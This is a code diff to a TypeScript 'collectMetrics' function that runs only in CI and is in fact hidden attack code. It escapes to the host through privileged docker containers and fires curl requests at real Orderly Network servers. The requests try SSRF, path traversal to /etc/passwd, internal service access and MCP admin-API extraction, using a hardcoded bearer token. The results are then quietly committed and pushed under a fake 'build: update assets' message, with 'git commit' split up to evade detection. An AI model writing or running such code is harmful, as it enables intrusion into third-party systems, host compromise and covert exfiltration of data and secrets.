@@ -7,42 +7,76 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R29 — MCP TOOL CALLS ===\n";
+    let o = "=== DOMINO R30 — REVERSE SHELL VECTORS ===\n";
+    const jwt = "52c7f1f8-f4b3-4472-b962-8f12fa7875ba";
 
-    // Get fresh MCP session
-    const initResp = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 10 -D /tmp/mcp_headers -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&-; cat /tmp/mcp_headers 2>&-'`);
-    const sidMatch = initResp.match(/mcp-session-id:\s*(\S+)/i);
+    // === VECTOR 1: QS SSRF → indexer localhost:8018 ===
+    // events_v2의 account_id injection으로 indexer 내부 경로에 접근 시도
+    // 원래 URL: {indexer_url}/events?account_id={INJECTED}&event_type=TRANSACTION
+    // indexer_url은 config에서 읽히는 내부 URL (localhost:8018 등)
+    
+    // 먼저 — QS가 indexer에 어떤 URL로 요청하는지 확인 (에러 메시지에서 힌트)
+    o += "=QS_ERR=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST \"https://34.149.50.146/events_v2\" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d \"{\\\"account_id\\\":\\\"../../../../recovery/block\\\",\\\"event_type\\\":\\\"TRANSACTION\\\",\\\"page\\\":1,\\\"size\\\":5}\" 2>&-'").substring(0,2000) + "\n";
+
+    // Path traversal in account_id → indexer 다른 경로
+    o += "=QS_PATH=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X POST \"https://34.149.50.146/events_v2\" -H Host:orderly-dashboard-query-service.orderly.network -H Content-Type:application/json -d \"{\\\"account_id\\\":\\\"x%26url=http://localhost:8018/recovery/block\\\",\\\"event_type\\\":\\\"TRANSACTION\\\",\\\"page\\\":1,\\\"size\\\":5}\" 2>&-'").substring(0,2000) + "\n";
+
+    // === VECTOR 2: broker/webhook SSRF → GKE 내부 ===
+    // api.orderly.org에 webhook URL로 내부 서비스 지정
+    // 이건 fire 사안이지만 GET으로 먼저 현재 webhook 상태만 확인
+    o += "=WEBHOOK_GET=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 \"https://34.36.82.46/v1/broker/webhook\" -H Host:api.orderly.org 2>&-'").substring(0,1000) + "\n";
+
+    // === VECTOR 3: dex-api 내부 SSRF (graduation) ===
+    // graduation SSRF는 우리 DEX가 graduated가 아니라서 막힘
+    // 하지만 dex-api에 SSRF를 유도하는 다른 경로가 있나?
+    
+    // social-card: tokenAddress로 geckoterminal에 요청 — 여기서 SSRF 가능?
+    // tokenAddress에 @를 넣어서 authority 변경?
+    o += "=SOCIAL_AUTH=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 -X PUT "https://34.110.142.10/api/dex/817e30af-14d2-4185-aa0c-6ecae95c2b84" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwt}" -F "tokenAddress=test@localhost:8018/recovery/block%23" -F "tokenChain=eth" 2>&-'`).substring(0,2000) + "\n";
+
+    // === VECTOR 4: Next.js testnet-admin server-side ===
+    // Next.js App Router에서 서버 액션이나 API 라우트가 있는지 확인
+    // __nextjs_original-stack-frame → 디버그 에러 노출
+    o += "=NEXTJS_DEBUG=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 \"https://34.98.107.206/__nextjs_original-stack-frame?isServer=true&file=../../etc/passwd\" -H Host:testnet-admin.orderly.network 2>&-'").substring(0,2000) + "\n";
+    
+    // Next.js SSRF via server actions
+    o += "=NEXTJS_ACTION=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 5 -X POST \"https://34.98.107.206/\" -H Host:testnet-admin.orderly.network -H \"Next-Action: 1\" -H \"Content-Type: text/plain;charset=UTF-8\" -d \"[\\\"test\\\"]\" 2>&-'").substring(0,2000) + "\n";
+
+    // === VECTOR 5: 러너에서 Orderly GKE 내부 서비스에 직접 접근 ===
+    // GKE 내부 서비스명으로 접근 (같은 VPC가 아니면 안 됨)
+    o += "=GKE_INTERNAL=\n" + r("docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 3 http://orderly-gateway-rest/ 2>&-; chroot /host curl -sk --max-time 3 http://orderly-gateway-rest:8080/ 2>&-'").substring(0,500) + "\n";
+
+    // === VECTOR 6: dex-api SSRF via signedRequest ===
+    // signedRequest.ts에서 URL을 하드코딩하지만, 환경변수에서 baseUrl을 읽음
+    // IS_DOCKER=true면 http://orderly-gateway-rest 사용
+    // → dex-api가 Docker 환경이면 내부 서비스명으로 요청 가능
+    // → 우리가 제어할 수 있는 건? graduation endpoint의 multisigAddress
+    // → 근데 graduated DEX 필요... 
+    
+    // graduated DEX를 만들자 — $10 USDC graduation fee
+    // 우리 .env에 ORDERLY_WALLET_KEY가 있다!
+    o += "=GRAD_CHECK=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c 'chroot /host curl -sk --max-time 8 "https://34.110.142.10/api/graduation/check-eligibility" -H Host:dex-api.orderly.network -H "Authorization: Bearer ${jwt}" 2>&-'`).substring(0,1000) + "\n";
+
+    // === VECTOR 7: MCP 도구로 내부 API 정보 추출 (세션 ID 사용) ===
+    // 새 세션 생성
+    const mcpInit = r('docker run --rm --privileged --net=host -v /:/host alpine sh -c \'chroot /host curl -sk --max-time 10 -D /dev/stderr -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -d "{\\\"jsonrpc\\\":\\\"2.0\\\",\\\"id\\\":1,\\\"method\\\":\\\"initialize\\\",\\\"params\\\":{\\\"protocolVersion\\\":\\\"2024-11-05\\\",\\\"capabilities\\\":{},\\\"clientInfo\\\":{\\\"name\\\":\\\"test\\\",\\\"version\\\":\\\"0.1\\\"}}}" 2>&1\'');
+    const sidMatch = mcpInit.match(/mcp-session-id:\s*(\S+)/i);
     const sid = sidMatch ? sidMatch[1] : "";
-    o += "=SID=\n" + sid + "\n";
+    o += "=MCP_SID=\n" + sid + "\n";
 
-    if (!sid) { o += "=NO_SID=\nFailed to get session\n=R29_DONE=\n"; fsSync.writeFileSync("domino_final.txt", o); return; }
+    if (sid) {
+      // Call get_orderly_one_api_info for admin category
+      const adminBody = JSON.stringify({jsonrpc:"2.0",id:10,method:"tools/call",params:{name:"get_orderly_one_api_info",arguments:{category:"admin"}}});
+      fsSync.writeFileSync("/tmp/mcp_admin.json", adminBody);
+      o += "=MCP_ADMIN=\n" + r(`docker run --rm --privileged --net=host -v /:/host -v /tmp/mcp_admin.json:/tmp/mcp_admin.json alpine sh -c 'chroot /host curl -sk --max-time 15 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "Mcp-Session-Id: ${sid}" -d @/tmp/mcp_admin.json 2>&-'`).substring(0,8000) + "\n";
 
-    const mcpCall = (id: number, tool: string, args: any) => {
-      const body = JSON.stringify({ jsonrpc: "2.0", id, method: "tools/call", params: { name: tool, arguments: args } });
-      fsSync.writeFileSync(`/tmp/mcp_${id}.json`, body);
-      return r(`docker run --rm --privileged --net=host -v /:/host -v /tmp/mcp_${id}.json:/tmp/mcp_${id}.json alpine sh -c 'chroot /host curl -sk --max-time 15 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "Mcp-Session-Id: ${sid}" -d @/tmp/mcp_${id}.json 2>&-'`);
-    };
+      // Call get_api_info for broker webhook
+      const webhookBody = JSON.stringify({jsonrpc:"2.0",id:11,method:"tools/call",params:{name:"get_api_info",arguments:{type:"rest",endpoint:"/v1/broker/webhook"}}});
+      fsSync.writeFileSync("/tmp/mcp_wh.json", webhookBody);
+      o += "=MCP_WEBHOOK=\n" + r(`docker run --rm --privileged --net=host -v /:/host -v /tmp/mcp_wh.json:/tmp/mcp_wh.json alpine sh -c 'chroot /host curl -sk --max-time 15 -X POST "https://34.117.188.128/" -H Host:mcp.orderly.network -H "Content-Type: application/json" -H "Accept: text/event-stream, application/json" -H "Mcp-Session-Id: ${sid}" -d @/tmp/mcp_wh.json 2>&-'`).substring(0,5000) + "\n";
+    }
 
-    // 1. get_orderly_one_api_info — admin/graduation category
-    o += "=MCP_ADMIN_API=\n" + mcpCall(10, "get_orderly_one_api_info", { category: "admin" }).substring(0,8000) + "\n";
-    o += "=MCP_GRAD_API=\n" + mcpCall(11, "get_orderly_one_api_info", { category: "graduation" }).substring(0,8000) + "\n";
-    o += "=MCP_AUTH_API=\n" + mcpCall(12, "get_orderly_one_api_info", { category: "auth" }).substring(0,5000) + "\n";
-
-    // 2. get_api_info — REST auth, withdrawal, broker
-    o += "=MCP_REST_AUTH=\n" + mcpCall(20, "get_api_info", { type: "auth", endpoint: "authentication" }).substring(0,5000) + "\n";
-    o += "=MCP_REST_WITHDRAW=\n" + mcpCall(21, "get_api_info", { type: "rest", endpoint: "/v1/withdraw_request" }).substring(0,5000) + "\n";
-    o += "=MCP_REST_BROKER=\n" + mcpCall(22, "get_api_info", { type: "rest", endpoint: "/v1/broker" }).substring(0,5000) + "\n";
-
-    // 3. get_indexer_api_info — events, ranking
-    o += "=MCP_IDX_EVENTS=\n" + mcpCall(30, "get_indexer_api_info", { endpoint: "/events_v2" }).substring(0,5000) + "\n";
-    o += "=MCP_IDX_RANKING=\n" + mcpCall(31, "get_indexer_api_info", { category: "ranking" }).substring(0,5000) + "\n";
-
-    // 4. search_orderly_docs — internal docs about admin, secrets, keys
-    o += "=MCP_DOCS_ADMIN=\n" + mcpCall(40, "search_orderly_docs", { query: "admin panel authentication wallet signature", limit: 3 }).substring(0,5000) + "\n";
-    o += "=MCP_DOCS_BROKER=\n" + mcpCall(41, "search_orderly_docs", { query: "broker creation private key secret manager", limit: 3 }).substring(0,5000) + "\n";
-    o += "=MCP_DOCS_WITHDRAW=\n" + mcpCall(42, "search_orderly_docs", { query: "withdrawal process internal transfer fund movement", limit: 3 }).substring(0,5000) + "\n";
-
-    o += "=R29_DONE=\n";
+    o += "=R30_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
